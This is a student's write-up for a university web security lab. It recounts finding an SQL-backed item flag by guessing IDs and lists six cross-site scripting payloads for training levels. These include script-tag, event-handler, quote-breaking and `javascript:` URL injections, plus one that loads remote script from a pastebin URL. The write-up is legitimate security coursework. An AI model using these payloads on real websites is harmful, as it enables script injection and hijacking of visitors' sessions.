Writeup 14 - Web II
=====

Name: Andrew Chalfant
Section: 0201

I pledge on my honor that I have not given or received any unauthorized assistance on this assignment or examination.

Digital acknowledgement of honor pledge: Andrew Chalfant

## Assignment 10 Writeup

### Part 1 (40 Pts)
For the site, I noticed the url was using sql syntax to retrieve data based on a specific user id. I played around with a couple different options such as trying to escape the input for the item and execute another SQL expression. In the end I found that simply bruteforcing different possible IDs work, and I eventually guessed an item ID of 1337 to get the flag CMSC38R-{y0U-are_the-5ql-n1nja}

### Part 2 (60 Pts)
1. Input "<script>alert();</script>" into search bar
2. Input <button onclick=alert();>Hello</button> into blog post
3. Input /frame#3' onclick='alert()''; into URL
4. Input ');alert();var b=(' into input
5. Input ?next=javascript:alert(); into URL
6. Input frame#hTtps://pastebin.com/raw/A2RXb4GF
